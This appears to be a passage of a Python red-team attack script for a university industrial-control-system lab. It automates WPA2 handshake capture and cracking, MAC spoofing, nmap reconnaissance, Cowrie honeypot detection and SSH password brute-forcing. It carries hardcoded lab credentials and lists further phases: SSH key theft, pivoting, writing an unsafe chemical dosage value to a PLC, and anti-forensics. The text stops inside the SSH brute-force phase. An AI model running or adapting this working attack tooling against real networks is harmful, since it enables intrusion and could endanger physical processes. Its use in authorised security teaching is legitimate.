#!/usr/bin/env python3

import subprocess
import sys
import os
import io
import re
import random
import threading
import time
import json
import argparse
import socket
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional


# ── Dependency bootstrap (inside venv) ───────────────────────────────────────
def _require(pkg, import_name=None):
    import importlib
    name = import_name or pkg
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"[*] Installing {pkg} into venv...")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], check=True)
        return importlib.import_module(name)

_require("rich")
_require("paramiko")
_require("pycomm3")

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.prompt import Confirm, Prompt
from rich.progress import (
    Progress, SpinnerColumn, BarColumn,
    TextColumn, TimeElapsedColumn, TaskProgressColumn,
)
from rich.live import Live
from rich.markup import escape
from rich.text import Text
import paramiko

console = Console()

# ── Static config — edit if your lab topology changes ────────────────────────
CFG = {
    "wifi": {
        "interface":    "wlan0",
        "monitor_iface":"wlan0",
        "ssid":         "HemoLock",
        "wordlist":     "/usr/share/wordlists/rockyou.txt",
        "capture_file": "/tmp/incs4810_capture",
    },
    "nmap": {
        "idmz_subnet":  "10.10.10.0/24",
        "ports":        "22,80,443,3000,8086,102,44818",
    },
    "historian": {
        "ip":       "10.10.10.20",
        "port":     22,
        "username": "admin",
        "password": "admin123",
    },
    "honeypot": {
        "ip": "10.10.10.50",
    },
    "ids": {
        "ip":       "10.20.20.5",
        "username": "admin",
        "password": "admin123",
        "port":     22,
    },
    "plc": {
        "ip":           "10.20.20.111",
        "type":         "Allen-Bradley / Rockwell (EtherNet/IP)",
        "tag":          "Dosage_Rate",
        "safe_value":   8,
        "attack_value": 32,
    },
    "hydra": {
        "wordlist": "/usr/share/wordlists/rockyou.txt",
        "threads":  4,
    },
}

# ── Result tracking ───────────────────────────────────────────────────────────
@dataclass
class PhaseResult:
    phase:   str
    status:  str = "pending"   # pending | success | failed | skipped
    output:  str = ""
    finding: str = ""
    ts:      str = field(default_factory=lambda: datetime.now().isoformat())


results: list[PhaseResult] = []

# ── Phase metadata ────────────────────────────────────────────────────────────
# (name, one-line description, estimated runtime)
PHASE_META: dict[int, tuple[str, str, str]] = {
    1: ("WiFi AP Crack",
        "MAC spoof → monitor mode → besside-ng capture → aircrack-ng → reconnect",
        "~3 min"),
    2: ("IDMZ Recon",
        "Discover gateway → probe subnets → nmap sweep → honeypot fingerprint → pick Historian",
        "~2 min"),
    3: ("SSH Brute Force",
        "Priority-list + rockyou paramiko brute force against Historian SSH",
        "~1–5 min"),
    4: ("SSH Pivot / OT Recon",
        "Land on Historian → steal SSH key → hop to IDS → OT fingerprint sweep",
        "~1 min"),
    5: ("CIP Recon — PLC Map",
        "SSH tunnel → LogixDriver slot hunt → enumerate + live-read all PLC tags",
        "~30 s"),
    6: ("PLC CIP Write Attack",
        "Interactive CIP shell with HMI stealth freeze and live tag manipulation",
        "~variable"),
    7: ("Defense Validation",
        "Hop to IDS → check Suricata alerts → confirm Layer 1 detection → anti-forensics",
        "~30 s"),
}

# ── UI helpers ────────────────────────────────────────────────────────────────

ASCII_BANNER = (
    "██╗  ██╗███████╗███╗   ███╗ ██████╗      ██╗      ██████╗  ██████╗██╗  ██╗\n"
    "██║  ██║██╔════╝████╗ ████║██╔═══██╗     ██║     ██╔═══██╗██╔════╝██║ ██╔╝\n"
    "███████║█████╗  ██╔████╔██║██║   ██║     ██║     ██║   ██║██║     █████╔╝ \n"
    "██╔══██║██╔══╝  ██║╚██╔╝██║██║   ██║     ██║     ██║   ██║██║     ██╔═██╗ \n"
    "██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝     ███████╗╚██████╔╝╚██████╗██║  ██╗\n"
    "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝      ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n"
    "\n"
    "      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗                    \n"
    "     ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                    \n"
    "     ███████║   ██║      ██║   ███████║██║     █████╔╝                     \n"
    "     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                     \n"
    "     ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                    \n"
    "     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ V1                 \n"
)


def banner():
    console.print(f"[bold red]{ASCII_BANNER}[/bold red]")
    console.print(Panel(
        "[bold white]INCS 4810 — Red Team Attack Chain[/bold white]  "
        "[dim]|  BCIT SW01-3550  |  ISA/IEC 62443[/dim]\n"
        "[dim]Instructor: Victor Mendez  |  BCIT SW01-3550[/dim]\n"
        "[bold yellow]All actions are authorized and confined to the isolated lab network.[/bold yellow]",
        border_style="red",
        expand=False,
    ))


def phase_header(n: int, title: str):
    console.print()
    console.rule(f"[bold cyan]Phase {n}: {title}[/bold cyan]")


def ok(msg: str):
    console.print(f"[bold green] ✔[/bold green] [green]{msg}[/green]")


def warn(msg: str):
    console.print(f"[bold yellow] ⚠[/bold yellow] [yellow]{msg}[/yellow]")


def err(msg: str):
    console.print(f"[bold red] ✘[/bold red] [red]{msg}[/red]")


def info(msg: str):
    console.print(f"[bold blue] ●[/bold blue] [blue]{msg}[/blue]")


def run_cmd(
    cmd: str,
    timeout: int = 120,
    capture: bool = True,
    silent: bool = False,
) -> tuple[int, str]:
    """Run a shell command, return (returncode, stdout+stderr).
    silent=True suppresses both the echoed command and its output."""
    if not silent:
        console.print(f"[dim]$ {escape(cmd)}[/dim]")
    try:
        proc = subprocess.run(
            cmd, shell=True, timeout=timeout,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        if capture and not silent:
            console.print(f"[dim]{escape(proc.stdout[-2000:])}[/dim]")
        return proc.returncode, proc.stdout
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"


def stream_cmd(
    cmd: str,
    timeout: int = 300,
    line_filter=None,
    stop_sentinel: str | None = None,
) -> tuple[int, str]:
    """Stream a command's output line-by-line with live display."""
    console.print(f"[dim]$ {escape(cmd)}[/dim]")
    lines: list[str] = []
    start = time.monotonic()

    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )

    try:
        for raw in proc.stdout:
            line = raw.rstrip()
            if not line:
                continue
            lines.append(line)
            styled = line_filter(line) if line_filter else f"[dim]{escape(line)}[/dim]"
            console.print(styled)
            if stop_sentinel and stop_sentinel in line:
                proc.terminate()
                break
    except Exception:
        pass
    finally:
        proc.wait()

    elapsed = time.monotonic() - start
    info(f"Finished in {elapsed:.1f}s  (exit {proc.returncode})")
    return proc.returncode, "\n".join(lines)


def _nmap_filter(line: str) -> str:
    lo = line.lower()
    if "nmap scan report" in lo:
        return f"[bold cyan]{escape(line)}[/bold cyan]"
    if "/tcp" in lo and "open" in lo:
        return f"[green]{escape(line)}[/green]"
    if "host is up" in lo:
        return f"[dim green]{escape(line)}[/dim green]"
    return f"[dim]{escape(line)}[/dim]"


def ssh_connect(hostname: str, username: str, password: str, port: int = 22) -> paramiko.SSHClient:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=hostname, port=port, username=username,
                   password=password, timeout=15)
    ok(f"SSH connected  {username}@{hostname}:{port}")
    return client


def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[str, str, int]:
    info(f"remote $ {escape(cmd)}")
    _, stdout_ch, stderr_ch = client.exec_command(cmd, timeout=timeout)
    stdout    = stdout_ch.read().decode()
    stderr    = stderr_ch.read().decode()
    exit_code = stdout_ch.channel.recv_exit_status()
    if stdout.strip():
        console.print(f"[dim]{escape(stdout.strip())}[/dim]")
    if stderr.strip():
        console.print(f"[dim red]{escape(stderr.strip())}[/dim red]")
    return stdout, stderr, exit_code


def ssh_hop(
    jump: paramiko.SSHClient,
    target_ip: str,
    target_port: int,
    target_user: str,
    target_pass: str | None = None,
    pkey: paramiko.PKey | None = None,
) -> paramiko.SSHClient:
    transport = jump.get_transport()
    dest_addr  = (target_ip,  target_port)
    local_addr = (transport.getpeername()[0], 0)
    chan = transport.open_channel("direct-tcpip", dest_addr, local_addr)

    inner = paramiko.SSHClient()
    inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    inner.connect(
        target_ip, port=target_port,
        username=target_user, password=target_pass, pkey=pkey,
        sock=chan, timeout=15, allow_agent=False, look_for_keys=False,
    )
    auth_method = "stolen key" if pkey else "password"
    ok(f"SSH hop → {target_user}@{target_ip}:{target_port}  [{auth_method}]")
    return inner


def _resolve_wordlist(path: str) -> str | None:
    candidates = [
        path, path + ".gz",
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/opt/wordlists/rockyou.txt",
        os.path.expanduser("~/rockyou.txt"),
    ]
    for p in candidates:
        if os.path.exists(p):
            if p.endswith(".gz"):
                extracted = p[:-3]
                if not os.path.exists(extracted):
                    info(f"Extracting {p} ...")
                    run_cmd(f"sudo gunzip -k {p}", capture=False)
                return extracted if os.path.exists(extracted) else None
            return p
    return None


def _find_gateway() -> str | None:
    rc, out = run_cmd("ip route show default", capture=False, silent=True)
    for line in out.splitlines():
        parts = line.split()
        if "default" in parts and "via" in parts:
            return parts[parts.index("via") + 1]
    return None


def _inject_route(subnet: str, via: str):
    run_cmd(f"sudo ip route add {subnet} via {via} 2>/dev/null || true",
            capture=False, silent=True)


def _probe_gateway_for_subnets(gateway: str) -> list[str]:
    info(f"Probing gateway {gateway} for reachable subnets...")
    sweep_targets = "10.0.0.0/8 172.16.0.0/12 192.168.0.0/16"
    rc, out = run_cmd(
        f"sudo nmap -T5 -n -sn -PS22,80,443,44818 --max-retries 1 "
        f"{sweep_targets} 2>/dev/null | grep 'Nmap scan report'",
        timeout=30, capture=False
    )
    found: set[str] = set()
    for line in out.splitlines():
        parts = line.strip().split()
        if parts:
            ip = parts[-1].strip("()")
            segments = ip.split(".")
            if len(segments) == 4:
                net = ".".join(segments[:3]) + ".0/24"
                found.add(net)
    return list(found)


def _get_local_interface() -> tuple[str, str] | tuple[None, None]:
    iface = CFG["wifi"]["interface"]
    _, addr_out = run_cmd(f"ip -4 route show dev {iface}", capture=False, silent=True)
    for line in addr_out.splitlines():
        parts = line.split()
        if parts and "/" in parts[0] and not parts[0].startswith("default"):
            return iface, parts[0]
    return iface, None


def _candidate_gateways(local_subnet: str | None, default_gw: str | None) -> list[str]:
    candidates: list[str] = []
    if local_subnet:
        prefix = ".".join(local_subnet.split("/")[0].split(".")[:3])
        for last_octet in ("1", "2", "254"):
            candidates.append(f"{prefix}.{last_octet}")
    if default_gw and default_gw not in candidates:
        candidates.append(default_gw)
    return candidates


def auto_route(subnets: list[str]):
    wifi_iface          = CFG["wifi"]["interface"]
    default_gw          = _find_gateway()
    iface, local_subnet = _get_local_interface()

    info(f"Wi-Fi interface : {iface}  subnet: {local_subnet}")
    info(f"Default gateway : {default_gw}")

    candidates = _candidate_gateways(local_subnet, default_gw)
    info(f"Gateway candidates: {candidates}")

    for subnet in subnets:
        info(f"Hunting route to {subnet}...")

        routed = False
        for gw in candidates:
            run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true",
                    capture=False, silent=True)
            run_cmd(
                f"sudo ip route add {subnet} via {gw} dev {wifi_iface} 2>/dev/null || true",
                capture=False, silent=True,
            )

            info(f"Testing route to {subnet} via {gw}...")
            rc, out = run_cmd(
                f"sudo nmap -sn -PS22,80,443,44818 -T5 --max-retries 1 {subnet} 2>/dev/null",
                timeout=15, capture=False,
            )
            if "Host is up" in out:
                ok(f"Route confirmed: {subnet} via [bold]{gw}[/bold] dev {wifi_iface}")
                routed = True
                break

            console.print(f"  [dim]via {gw} → no live hosts in {subnet}, trying next...[/dim]")
            run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true",
                    capture=False, silent=True)

        if not routed:
            err(f"No valid route found for {subnet} — tried {candidates}.")


def preflight_check():
    tools = ["nmap", "aircrack-ng", "airodump-ng", "besside-ng", "airmon-ng", "macchanger"]
    missing = []
    for tool in tools:
        rc, _ = run_cmd(f"which {tool}", capture=False, silent=True)
        if rc != 0:
            missing.append(tool)
    if missing:
        err(f"Missing tools: {', '.join(missing)}")
        err("Install with: sudo apt-get install -y nmap aircrack-ng")
        sys.exit(1)
    ok(f"Preflight OK — all tools present")


# ── Startup phase plan ────────────────────────────────────────────────────────

def _phase_plan_panel(selected: set[int]):
    """Print a summary table of all phases before execution begins."""
    console.print()
    tbl = Table(
        title="[bold white]Attack Chain — Phase Plan[/bold white]",
        show_header=True, header_style="bold cyan",
        border_style="dim", show_lines=False, padding=(0, 1),
    )
    tbl.add_column("#",       style="dim",    width=3,  justify="right")
    tbl.add_column("Phase",   style="cyan",   width=26)
    tbl.add_column("Description",             width=56)
    tbl.add_column("ETA",     style="yellow", width=9)
    tbl.add_column("State",                   width=10)

    for n, title, _ in PHASES:
        desc, eta = PHASE_META.get(n, ("", "?"))[1], PHASE_META.get(n, ("", "", "?"))[2]
        if n in selected:
            state = "[bold green]QUEUED[/bold green]"
        else:
            state = "[dim]SKIP[/dim]"
        tbl.add_row(str(n), title, desc, eta, state)

    console.print(Panel(tbl, border_style="cyan", expand=False))
    console.print()


# ── Per-phase confirmation panel ──────────────────────────────────────────────

def confirm_phase(n: int, title: str) -> bool:
    """Show a styled phase card and ask for confirmation."""
    meta   = PHASE_META.get(n, (title, "No description available.", "?"))
    desc   = meta[1]
    eta    = meta[2]

    console.print()
    console.print(Panel(
        f"[bold white]Phase {n} of {len(PHASES)}[/bold white]  —  [bold cyan]{title}[/bold cyan]\n\n"
        f"[dim]{desc}[/dim]\n\n"
        f"[bold white]Estimated runtime:[/bold white] [yellow]{eta}[/yellow]",
        title=f"[bold cyan] Ready to Execute [/bold cyan]",
        border_style="cyan", expand=False,
    ))
    return Confirm.ask(f"[yellow]Run Phase {n}: {title}?[/yellow]", default=True)


# ── Post-phase status card ────────────────────────────────────────────────────

def _phase_status_card(n: int, title: str, status: str, finding: str, elapsed: float):
    COLOR = {"success": "green", "failed": "red",   "skipped": "yellow"}
    ICON  = {"success": "✔",     "failed": "✘",      "skipped": "⊘"}
    c = COLOR.get(status, "white")
    i = ICON.get(status, "●")
    console.print(Panel(
        f"[bold {c}]{i}  {status.upper()}[/bold {c}]   "
        f"[dim]elapsed [bold]{elapsed:.1f}s[/bold][/dim]\n"
        f"[dim]{escape(finding) if finding else '—'}[/dim]",
        title=f"[bold {c}] Phase {n}: {title} [/bold {c}]",
        border_style=c, expand=False,
    ))


# ── Phase implementations ─────────────────────────────────────────────────────

def _parse_airodump_csv(csv_path: str) -> list[dict]:
    aps: list[dict] = []
    try:
        with open(csv_path, errors="ignore") as f:
            in_ap_section = True
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if line.startswith("Station MAC"):
                    in_ap_section = False
                    continue
                if not in_ap_section:
                    continue
                if line.startswith("BSSID"):
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 14:
                    continue
                bssid   = parts[0]
                power   = parts[8]
                channel = parts[3]
                ssid    = parts[13]
                if len(bssid) != 17 or bssid.count(":") != 5:
                    continue
                aps.append({
                    "bssid":   bssid,
                    "ssid":    ssid if ssid else "<hidden>",
                    "channel": channel,
                    "power":   power,
                })
    except FileNotFoundError:
        pass
    return aps


def phase1_wifi_crack() -> PhaseResult:
    phase_header(1, "WiFi AP Crack (WPA2 Handshake)")
    r = PhaseResult("WiFi Crack")

    cap   = CFG["wifi"]["capture_file"]
    iface = CFG["wifi"]["interface"]
    wl    = _resolve_wordlist(CFG["wifi"]["wordlist"])

    def _restore_managed():
        info(f"Restoring {iface} to managed mode...")
        run_cmd(f"sudo ifconfig {iface} down",         capture=False, silent=True)
        run_cmd(f"sudo iwconfig {iface} mode managed", capture=False, silent=True)
        run_cmd(f"sudo ifconfig {iface} up",           capture=False, silent=True)

    try:
        ok(f"Randomising MAC address on {iface}...")
        run_cmd(f"sudo ifconfig {iface} down",  capture=False)
        run_cmd(f"sudo macchanger -r {iface}",  capture=False)

        ok(f"Putting {iface} into monitor mode...")
        run_cmd(f"sudo iwconfig {iface} mode monitor", capture=False)
        run_cmd(f"sudo ifconfig {iface} up",           capture=False)

        scan_tmp = "/tmp/incs4810_scan"
        run_cmd(f"sudo rm -f {scan_tmp}*", capture=False, silent=True)
        console.print()
        info("Scanning for access points — 15 s, please wait...")
        run_cmd(
            f"sudo timeout 15 airodump-ng --output-format csv -w {scan_tmp} {iface} 2>/dev/null",
            timeout=20, capture=False,
        )

        aps = _parse_airodump_csv(f"{scan_tmp}-01.csv")
        if not aps:
            err("No APs found — check that the interface name in CFG is correct")
            r.status  = "failed"
            r.finding = "AP scan returned no results"
            return r

        ap_table = Table(
            title="[bold magenta]Discovered Access Points[/bold magenta]",
            show_header=True, header_style="bold cyan", border_style="dim",
        )
        ap_table.add_column("#",     style="dim",    width=4)
        ap_table.add_column("SSID",  style="green",  width=26)
        ap_table.add_column("BSSID", style="yellow", width=20)
        ap_table.add_column("CH",    style="cyan",   width=5)
        ap_table.add_column("PWR",   style="white",  width=6)
        for i, ap in enumerate(aps, 1):
            ap_table.add_row(str(i), ap["ssid"], ap["bssid"],
                             ap["channel"].strip(), ap["power"].strip())
        console.print(ap_table)
        console.print("[dim]  Enter AP # to target, or [bold]q[/bold] to skip[/dim]")
        console.print()

        raw = Prompt.ask("[yellow]Target AP #[/yellow]").strip().lower()
        if raw == "q":
            r.status  = "skipped"
            r.finding = "Skipped by operator"
            return r
        try:
            chosen = aps[int(raw) - 1]
        except (ValueError, IndexError):
            err(f"'{raw}' is not a valid choice")
            r.status  = "failed"
            r.finding = "No AP selected"
            return r

        bssid   = chosen["bssid"]
        channel = chosen["channel"].strip()
        ok(f"Target locked: [bold green]{chosen['ssid']}[/bold green]  "
           f"BSSID=[bold]{bssid}[/bold]  CH={channel}")

        while True:
            run_cmd(f"sudo rm -f {cap}*", capture=False, silent=True)

            console.print()
            console.print(Panel(
                f"[bold white]Interface :[/bold white] {iface}\n"
                f"[bold white]Target    :[/bold white] {chosen['ssid']}  ({bssid})\n"
                f"[bold white]Channel   :[/bold white] {channel}\n"
                f"[bold white]Duration  :[/bold white] 90 s\n"
                f"[bold white]Method    :[/bold white] [green]besside-ng (targeted deauth)[/green]",
                title="[bold cyan] Capturing Handshake [/bold cyan]",
                border_style="cyan", expand=False,
            ))

            run_cmd("sudo rm -f ./wpa.cap ./wepe.cap ./besside.log ./cracked.txt",
                    capture=False, silent=True)

            run_cmd(f"sudo besside-ng -b {bssid} {iface}", timeout=90)

            wl_arg = wl if wl else "/usr/share/wordlists/rockyou.txt"
            found_password = ""

            if not os.path.exists("./wpa.cap"):
                warn("No wpa.cap created — besside-ng may have lost monitor mode")
            else:
                ok("wpa.cap found — cracking with aircrack-ng...")
                run_cmd(
                    f"sudo aircrack-ng ./wpa.cap -w {wl_arg} -l cracked.txt",
                    timeout=60,
                )
                if os.path.exists("./cracked.txt"):
                    with open("./cracked.txt", "r", errors="ignore") as f:
                        found_password = f.read().strip()

                if not found_password:
                    rc2, out2 = run_cmd(
                        f"sudo aircrack-ng ./wpa.cap -w {wl_arg}", timeout=60
                    )
                    clean_out = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", out2)
                    m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", clean_out)
                    if m:
                        found_password = m.group(1).strip()

            if found_password:
                r.status  = "success"
                r.finding = f"KEY FOUND! [ {found_password} ]"
                ok(r.finding)

                _restore_managed()

                ssid = chosen["ssid"]
                ok(f"Connecting to [bold]{ssid}[/bold] via NetworkManager...")
                run_cmd(f"sudo nmcli con delete '{ssid}' 2>/dev/null || true",
                        capture=False)
                run_cmd(
                    f"sudo nmcli con add type wifi ifname {iface} "
                    f"con-name '{ssid}' ssid '{ssid}' -- "
                    f"wifi-sec.key-mgmt wpa-psk wifi-sec.psk '{found_password}'",
                    capture=True,
                )
                run_cmd(f"sudo nmcli con up '{ssid}'", capture=True)
                info("Waiting 5 s for DHCP lease...")
                time.sleep(5)
                ok(f"{iface} should now have an IP on the target network")
                return r

            warn("aircrack-ng did not find the key")
            console.print()
            if not Confirm.ask(
                "[yellow]Retry besside-ng capture on this AP?[/yellow]", default=True
            ):
                break

        r.status  = "failed"
        r.finding = "Handshake not cracked — try a longer capture or bigger wordlist"
        err(r.finding)

    finally:
        _restore_managed()

    return r


def _parse_nmap_hosts(nmap_output: str) -> dict[str, list[str]]:
    hosts: dict[str, list[str]] = {}
    current_ip: str | None = None
    for line in nmap_output.splitlines():
        m = re.search(r"Nmap scan report for (\S+)", line)
        if m:
            current_ip = m.group(1).strip("()")
            hosts.setdefault(current_ip, [])
            continue
        if current_ip and "/tcp" in line and "open" in line:
            port = line.split("/")[0].strip()
            hosts[current_ip].append(port)
    return {ip: ports for ip, ports in hosts.items() if ports}


def _detect_cowrie(ip: str, port: int = 22) -> bool:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=ip, port=port,
            username="fake_hunter99",
            password="FakePassw0rd!@#88",
            timeout=3, banner_timeout=3,
            allow_agent=False, look_for_keys=False,
        )
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False


def phase2_idmz_recon() -> PhaseResult:
    phase_header(2, "IDMZ Recon (autonomous)")
    r = PhaseResult("IDMZ Recon")

    ports = CFG["nmap"]["ports"]

    info("Discovering Wi-Fi gateway...")
    gateway = _find_gateway()
    if not gateway:
        r.status  = "failed"
        r.finding = "No default gateway found — is wlan0 associated?"
        err(r.finding)
        return r
    ok(f"Gateway: {gateway}")

    info("Probing gateway for reachable subnets...")
    discovered_subnets = _probe_gateway_for_subnets(gateway)
    if not discovered_subnets:
        warn("Subnet probe returned nothing — falling back to CFG idmz_subnet")
        discovered_subnets = [CFG["nmap"]["idmz_subnet"]]
    else:
        ok(f"Discovered subnets: {', '.join(discovered_subnets)}")

    info("Injecting routes for all discovered subnets...")
    auto_route(discovered_subnets)

    all_nmap_out = ""
    live_hosts: dict[str, list[str]] = {}

    for subnet in discovered_subnets:
        nmap_cmd = f"sudo nmap -T4 -n -sS -Pn -p {ports} --open {subnet}"
        info(f"Sweeping {subnet}  ports {ports}")
        rc, out  = stream_cmd(nmap_cmd, timeout=120, line_filter=_nmap_filter)
        all_nmap_out += out
        live_hosts.update(_parse_nmap_hosts(out))

    if not live_hosts:
        r.status  = "failed"
        r.finding = "No hosts with open ports found across discovered subnets"
        err(r.finding)
        r.output  = all_nmap_out[-2000:]
        return r

    info("Fingerprinting SSH hosts for Cowrie honeypot signatures...")
    cowrie_flags: dict[str, bool] = {}
    for ip, open_ports in live_hosts.items():
        if "22" in open_ports:
            info(f"  Testing {ip}:22 with fake credentials...")
            is_trap = _detect_cowrie(ip, port=22)
            cowrie_flags[ip] = is_trap
            if is_trap:
                warn(f"  🍯 {ip} accepted garbage creds — Cowrie honeypot confirmed!")
            else:
                ok(f"  {ip} rejected fake creds — real SSH server")

    trap_ips = {ip for ip, v in cowrie_flags.items() if v}

    host_table = Table(
        title="[bold magenta]Discovered Live Hosts[/bold magenta]",
        show_header=True, header_style="bold cyan",
        border_style="dim", show_lines=True,
    )
    host_table.add_column("#",            style="dim",    width=4)
    host_table.add_column("IP Address",   style="green",  width=18)
    host_table.add_column("Open Ports",   style="yellow", width=36)
    host_table.add_column("Fingerprint",  width=28)

    host_list = list(live_hosts.items())
    for i, (ip, open_ports) in enumerate(host_list, 1):
        ports_str = ", ".join(open_ports)
        if ip in trap_ips:
            fp_cell = "[bold yellow]🍯 HONEYPOT (Cowrie)[/bold yellow]"
            host_table.add_row(
                f"[yellow]{i}[/yellow]",
                f"[bold yellow]{ip}[/bold yellow]",
                f"[yellow]{ports_str}[/yellow]",
                fp_cell,
            )
        elif "22" in open_ports:
            host_table.add_row(str(i), ip, ports_str, "[bold green]✔ Real SSH[/bold green]")
        else:
            host_table.add_row(str(i), ip, ports_str, "[dim]— (no SSH)[/dim]")

    console.print(host_table)

    if trap_ips:
        console.print(Panel(
            "\n".join(
                f"[bold yellow]⚠  {ip}[/bold yellow] — Cowrie honeypot. "
                "Do NOT select — it logs all keystrokes and alerts blue team."
                for ip in trap_ips
            ),
            title="[bold yellow] Honeypot Warning [/bold yellow]",
            border_style="yellow", expand=False,
        ))

    console.print(
        "[dim]  Select the Historian (✔ Real SSH preferred).  "
        "[bold]q[/bold] = abort[/dim]"
    )
    console.print()

    raw = Prompt.ask(
        f"[yellow]Select Historian IP # (1–{len(host_list)})[/yellow]"
    ).strip().lower()
    if raw == "q":
        r.status  = "skipped"
        r.finding = "Skipped by operator"
        return r
    try:
        chosen_ip, chosen_ports = host_list[int(raw) - 1]
    except (ValueError, IndexError):
        r.status  = "failed"
        r.finding = "Invalid selection"
        err(r.finding)
        return r

    if chosen_ip in trap_ips:
        warn(f"⚠  {chosen_ip} is a confirmed Cowrie honeypot — selection noted")

    CFG["historian"]["ip"] = chosen_ip
    ok(f"Historian locked: [bold]{chosen_ip}[/bold]  ports: {', '.join(chosen_ports)}")

    trap_count = len(trap_ips)
    r.status  = "success"
    r.finding = (
        f"Historian: {chosen_ip}  |  "
        f"{len(live_hosts)} hosts across {len(discovered_subnets)} subnet(s)  |  "
        f"{trap_count} honeypot(s) flagged"
    )
    r.output  = all_nmap_out[-2000:]
    return r


def _tcp_reachable(ip: str, port: int, timeout: float = 1.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def _ssh_bruteforce(
    ip: str,
    port: int,
    username: str,
    wordlist_path: str,
    delay: float = 0.2,
) -> str | None:
    """
    Sequential paramiko SSH brute forcer.
    - AuthenticationException  → wrong password, move on
    - SSHException / EOFError  → transient banner error, retry up to 2× with backoff
    - timeout / OS error       → abort after 3 consecutive failures
    """
    import logging
    logging.getLogger("paramiko").setLevel(logging.CRITICAL)

    priority = ["", username, username[::-1], f"{username}123", "password", "admin123"]
    try:
        with open(wordlist_path, errors="ignore") as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except (FileNotFoundError, OSError):
        wordlist = []

    candidates            = list(dict.fromkeys(priority + wordlist))
    total                 = len(candidates)
    MAX_CONSECUTIVE_ERRS  = 3
    RATE_LIMIT_EVERY      = 5

    consecutive_errs  = 0
    attempt_count     = 0
    found_password: str | None = None

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=28),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        task = progress.add_task(f"Attempting {username}@{ip}", total=total)

        for pw in candidates:
            if progress.finished:
                break

            progress.update(task,
                description=f"[bold cyan]Attempting: {username}@{ip}  pw: {pw[:20]}[/bold cyan]")

            attempt_count += 1
            if attempt_count % RATE_LIMIT_EVERY == 0:
                time.sleep(0.5)

            banner_retries = 0
            while True:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        hostname=ip, port=port,
                        username=username, password=pw,
                        timeout=5, allow_agent=False, look_for_keys=False,
                        banner_timeout=10, auth_timeout=8,
                        disabled_algorithms={"pubkeys": ["rsa-sha2-256", "rsa-sha2-512"]},
                    )
                    client.close()
                    consecutive_errs = 0
                    found_password   = pw
                    progress.update(task, completed=total,
                        description=f"[bold green]✔ FOUND: {username}@{ip}  pw: {pw}[/bold green]")
                    break

                except paramiko.AuthenticationException:
                    consecutive_errs = 0
                    time.sleep(delay)
                    break

                except (paramiko.SSHException, EOFError) as e:
                    banner_retries += 1
                    if banner_retries <= 2:
                        sleep_t = random.uniform(1.5, 3.0)
                        progress.update(task,
                            description=f"[yellow]Banner error — retry {banner_retries}/2 in {sleep_t:.1f}s[/yellow]")
                        time.sleep(sleep_t)
                        continue
                    time.sleep(delay)
                    break

                except (socket.timeout, socket.error,
                        paramiko.ssh_exception.NoValidConnectionsError, OSError):
                    consecutive_errs += 1
                    progress.update(task,
                        description=f"[yellow]⚠ Timeout {consecutive_errs}/{MAX_CONSECUTIVE_ERRS}[/yellow]")
                    if consecutive_errs >= MAX_CONSECUTIVE_ERRS:
                        progress.update(task,
                            description="[red]✘ Network blocked — aborting[/red]")
                        return None
                    time.sleep(1.0)
                    break

            if found_password is not None:
                break
            progress.advance(task)

    return found_password


def phase3_ssh_bruteforce() -> PhaseResult:
    phase_header(3, "SSH Brute Force on Historian (paramiko)")
    r = PhaseResult("SSH Brute Force")

    ip   = CFG["historian"]["ip"]
    port = CFG["historian"]["port"]
    user = CFG["historian"]["username"]
    wl   = _resolve_wordlist(CFG["hydra"]["wordlist"])

    console.print(Panel(
        f"[bold white]Target   :[/bold white] [bold yellow]{user}@{ip}:{port}[/bold yellow]\n"
        f"[bold white]Wordlist :[/bold white] {wl or 'priority list only'}",
        title="[bold red] SSH Brute Force Initiated [/bold red]",
        border_style="red", expand=False, padding=(1, 4),
    ))

    MAX_PROBE_ATTEMPTS = 3
    for attempt in range(1, MAX_PROBE_ATTEMPTS + 1):
        info(f"TCP probe {attempt}/{MAX_PROBE_ATTEMPTS} → {ip}:{port}")
        if _tcp_reachable(ip=ip, port=port, timeout=4.0):
            ok(f"Port {port} open on {ip} — starting brute force")
            break
        warn(f"Attempt {attempt} timed out")
        if attempt < MAX_PROBE_ATTEMPTS:
            time.sleep(2)
    else:
        r.status  = "failed"
